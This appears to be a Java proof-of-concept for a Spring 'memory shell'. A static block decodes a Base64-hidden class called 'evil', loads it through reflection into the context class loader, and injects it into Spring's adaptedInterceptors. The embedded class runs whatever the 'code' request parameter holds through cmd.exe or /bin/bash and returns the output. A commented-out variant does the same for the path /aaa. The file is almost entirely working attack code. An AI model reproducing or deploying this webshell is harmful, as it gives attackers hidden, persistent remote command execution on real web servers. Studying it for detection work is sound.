import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Base64;

/**
 * @ClassName: interceptorMem
 * @Auther: niko
 * @Date: 2024/9/30 15:50
 * @Description:
 */
public class interceptorMem {
static {
    try {
        String bs64 = "yv66vgAAADQAmAoAIgBSCAA9CwBTAFQLAFUAVggAVwoAWABZCgALAFoIAFsKAAsAXAcAXQcAXggAXwgAYAoACgBhCABiCABjCgAKAGQKAAoAZQcAZgcAZwoAaABpCgAUAGoKABMAawoAEwBsCQBYAG0KAG4AbwoAcABvCgBwAHEKAHAAcgcAcwsAIwB0CwAjAHUHAHYHAHcHAHgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABkxldmlsOwEACXByZUhhbmRsZQEAZChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7KVoBAAFwAQAaTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAAZ3cml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAdwcm9jZXNzAQATTGphdmEvbGFuZy9Qcm9jZXNzOwEAAXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAAZyZXN1bHQBABJMamF2YS9sYW5nL1N0cmluZzsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHaGFuZGxlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABGNvZGUBAA1TdGFja01hcFRhYmxlBwBeBwB5BwBdBwB2BwB6BwB7BwB3BwBzAQAKRXhjZXB0aW9ucwEACnBvc3RIYW5kbGUBAJIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0O0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L01vZGVsQW5kVmlldzspVgEADG1vZGVsQW5kVmlldwEALkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L01vZGVsQW5kVmlldzsBAA9hZnRlckNvbXBsZXRpb24BAHkoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvRXhjZXB0aW9uOylWAQACZXgBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAApTb3VyY2VGaWxlAQAJZXZpbC5qYXZhDAAkACUHAHoMAHwAfQcAewwAfgB/AQAHb3MubmFtZQcAgAwAgQB9DACCAIMBAAN3aW4MAIQAhQEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMACQAhgEACS9iaW4vYmFzaAEAAi1jDACHAIgMAIkAigEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwCLDACMAI0MACQAjgwAJACPDACQAIMMAJEAkgcAkwwAlACVBwB5DACWACUMAJcAJQEAE2phdmEvbGFuZy9FeGNlcHRpb24MAEgASQwATABNAQAEZXZpbAEAEGphdmEvbGFuZy9PYmplY3QBADJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L0hhbmRsZXJJbnRlcmNlcHRvcgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEAE3JlZGlyZWN0RXJyb3JTdHJlYW0BAB0oWilMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVmbHVzaAEABWNsb3NlACEAIQAiAAEAIwAAAAQAAQAkACUAAQAmAAAALwABAAEAAAAFKrcAAbEAAAACACcAAAAGAAEAAAAPACgAAAAMAAEAAAAFACkAKgAAAAEAKwAsAAIAJgAAAboABgAKAAAArisSArkAAwIAOgQZBMYAoCy5AAQBADoFEgW4AAa2AAcSCLYACZkAIrsAClkGvQALWQMSDFNZBBINU1kFGQRTtwAOOganAB+7AApZBr0AC1kDEg9TWQQSEFNZBRkEU7cADjoGGQYEtgARVxkGtgASOge7ABNZuwAUWRkHtgAVtwAWtwAXOggZCLYAGDoJsgAZGQm2ABoZBRkJtgAbGQW2ABwZBbYAHacABToFA6wErAABAA8ApQCoAB4AAwAnAAAASgASAAAALgAKAC8ADwAxABcAMwAnADQARgA2AGIAOABpADkAcAA6AIUAOwCMADwAlAA9AJsAPgCgAD8ApQBBAKgAQACqAEIArABEACgAAABwAAsAQwADAC0ALgAGABcAjgAvADAABQBiAEMALQAuAAYAcAA1ADEAMgAHAIUAIAAzADQACACMABkANQA2AAkAAACuACkAKgAAAAAArgA3ADgAAQAAAK4AOQA6AAIAAACuADsAPAADAAoApAA9ADYABAA+AAAALAAF/QBGBwA/BwBA/AAbBwBB/wBFAAUHAEIHAEMHAEQHAEUHAD8AAQcARgEBAEcAAAAEAAEAHgABAEgASQACACYAAABgAAUABQAAAAoqKywtGQS3AB+xAAAAAgAnAAAACgACAAAASQAJAEoAKAAAADQABQAAAAoAKQAqAAAAAAAKADcAOAABAAAACgA5ADoAAgAAAAoAOwA8AAMAAAAKAEoASwAEAEcAAAAEAAEAHgABAEwATQACACYAAABgAAUABQAAAAoqKywtGQS3ACCxAAAAAgAnAAAACgACAAAATgAJAE8AKAAAADQABQAAAAoAKQAqAAAAAAAKADcAOAABAAAACgA5ADoAAgAAAAoAOwA8AAMAAAAKAE4ATwAEAEcAAAAEAAEAHgABAFAAAAACAFE=";

        byte[] bytes = Base64.getDecoder().decode(bs64);
        Method method = ClassLoader.class.getDeclaredMethod("defineClass",String.class, byte[].class, int.class, int.class);
        method.setAccessible(true);
        String className = "evil";
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        method.invoke(classLoader,className,bytes,0,bytes.length);
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping) context.getBean("requestMappingHandlerMapping");
        Field field = null;
        field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        field.setAccessible(true);
        ArrayList<Object> o = (ArrayList<Object>) field.get(abstractHandlerMapping);
//        String[] path = new String[]{"/aaa"};
            HandlerInterceptor m = (HandlerInterceptor) classLoader.loadClass(className).newInstance();
//        MappedInterceptor mappedInterceptor = new MappedInterceptor(path, null, (HandlerInterceptor) classLoader.loadClass(className).newInstance());
        o.add(classLoader.loadClass(className).newInstance());
    } catch (Exception e) {
        e.printStackTrace();
    }
}
//    public interceptorMem() {
//
//        try {
//            String bs64 = "yv66vgAAADQAjgoAHgBOCABPCgBQAFEKAAcAUggAUwoABwBUBwBVCABWCABXCABYCwBZAFoIAFsIAFwKAF0AXgoAXQBfCgBgAGEHAGIKABEAYwgAZAoAEQBlCgARAGYKABEAZwgAaAsAaQBqBwBrCgAZAGwLAB8AbQsAHwBuBwBvBwBwBwBxAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBADJMY29tL2V4YW1wbGUvc3ByaW5nbWVtL2RlbW9zL3dlYi9ldmlsX2ludGVyY2VwdG9yOwEACXByZUhhbmRsZQEAZChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7KVoBAAtpbnB1dFN0cmVhbQEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAAXMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAGb3V0cHV0AQASTGphdmEvbGFuZy9TdHJpbmc7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdoYW5kbGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAHY21kbGluZQEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAZvc1R5cGUBAA1TdGFja01hcFRhYmxlBwA4BwBVBwByBwBiBwBvBwBzBwB0BwBwBwBrAQAKRXhjZXB0aW9ucwEACnBvc3RIYW5kbGUBAJIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0O0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L01vZGVsQW5kVmlldzspVgEADG1vZGVsQW5kVmlldwEALkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L01vZGVsQW5kVmlldzsBAA9hZnRlckNvbXBsZXRpb24BAHkoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvRXhjZXB0aW9uOylWAQACZXgBAApTb3VyY2VGaWxlAQAVZXZpbF9pbnRlcmNlcHRvci5qYXZhDAAgACEBAAdvcy5uYW1lBwB1DAB2AHcMAHgAeQEAA3dpbgwAegB7AQAQamF2YS9sYW5nL1N0cmluZwEAB2NtZC5leGUBAAIvYwEAA2NtZAcAcwwAfAB3AQAHL2Jpbi9zaAEAAi1jBwB9DAB+AH8MAIAAgQcAggwAgwCEAQARamF2YS91dGlsL1NjYW5uZXIMACAAhQEAAlxBDACGAIcMAIgAiQwAigB5AQAABwB0DACLAIwBABNqYXZhL2xhbmcvRXhjZXB0aW9uDACNACEMAEUARgwASQBKAQAwY29tL2V4YW1wbGUvc3ByaW5nbWVtL2RlbW9zL3dlYi9ldmlsX2ludGVyY2VwdG9yAQAQamF2YS9sYW5nL09iamVjdAEAMm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvSGFuZGxlckludGVyY2VwdG9yAQATamF2YS9pby9JbnB1dFN0cmVhbQEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAMZ2V0UGFyYW1ldGVyAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEAD2dldE91dHB1dFN0cmVhbQEAJSgpTGphdmF4L3NlcnZsZXQvU2VydmxldE91dHB1dFN0cmVhbTsBAA9wcmludFN0YWNrVHJhY2UAIQAdAB4AAQAfAAAABAABACAAIQABACIAAAAvAAEAAQAAAAUqtwABsQAAAAIAIwAAAAYAAQAAABMAJAAAAAwAAQAAAAUAJQAmAAAAAQAnACgAAgAiAAABhgAFAAoAAACTAToEEgK4AAM6BRkFtgAEEgW2AAaZAB8GvQAHWQMSCFNZBBIJU1kFKxIKuQALAgBTpwAcBr0AB1kDEgxTWQQSDVNZBSsSCrkACwIAUzoEuAAOGQS2AA+2ABA6BrsAEVkZBrcAEhITtgAUOgcZB7YAFZkACxkHtgAWpwAFEhc6CCy5ABgBADoJpwAKOgYZBrYAGgSsAAEACgCHAIoAGQADACMAAAAuAAsAAAAWAAMAFwAKABkATgAaAFsAGwBrABwAfwAdAIcAJACKACIAjAAjAJEAJgAkAAAAZgAKAFsALAApACoABgBrABwAKwAsAAcAfwAIAC0ALgAIAIwABQAvADAABgAAAJMAJQAmAAAAAACTADEAMgABAAAAkwAzADQAAgAAAJMANQA2AAMAAwCQADcAOAAEAAoAiQA5AC4ABQA6AAAAOQAG/QAzBwA7BwA8WAcAO/0ALgcAPQcAPkEHADz/AAwABgcAPwcAQAcAQQcAQgcAOwcAPAABBwBDBgBEAAAABAABABkAAQBFAEYAAgAiAAAAYAAFAAUAAAAKKissLRkEtwAbsQAAAAIAIwAAAAoAAgAAACsACQAsACQAAAA0AAUAAAAKACUAJgAAAAAACgAxADIAAQAAAAoAMwA0AAIAAAAKADUANgADAAAACgBHAEgABABEAAAABAABABkAAQBJAEoAAgAiAAAAYAAFAAUAAAAKKissLRkEtwAcsQAAAAIAIwAAAAoAAgAAADAACQAxACQAAAA0AAUAAAAKACUAJgAAAAAACgAxADIAAQAAAAoAMwA0AAIAAAAKADUANgADAAAACgBLADAABABEAAAABAABABkAAQBMAAAAAgBN";
//
//            byte[] bytes = Base64.getDecoder().decode(bs64);
//            Method method = ClassLoader.class.getDeclaredMethod("defineClass",String.class, byte[].class, int.class, int.class);
//            method.setAccessible(true);
//            String className = "com.example.springmem.demos.web.evil_interceptor";
//            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
//            method.invoke(classLoader,className,bytes,0,bytes.length);
//            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
//            AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping) context.getBean("requestMappingHandlerMapping");
//            Field field = null;
//            field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
//            field.setAccessible(true);
//            ArrayList<Object> o = (ArrayList<Object>) field.get(abstractHandlerMapping);
//            String[] path = new String[]{"/aaa"};
////            HandlerInterceptor m = (HandlerInterceptor) classLoader.loadClass(className).newInstance();
//            MappedInterceptor mappedInterceptor = new MappedInterceptor(path, null, (HandlerInterceptor) classLoader.loadClass(className).newInstance());
//            o.add(mappedInterceptor);
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//
//    }
//    public Object invokeMethod(String classname,String method) throws NoSuchMethodException {
//
////        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
//////        类加载
////        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
////        defineClass.invoke(classLoader,classname)
//        return null;
//    }

}
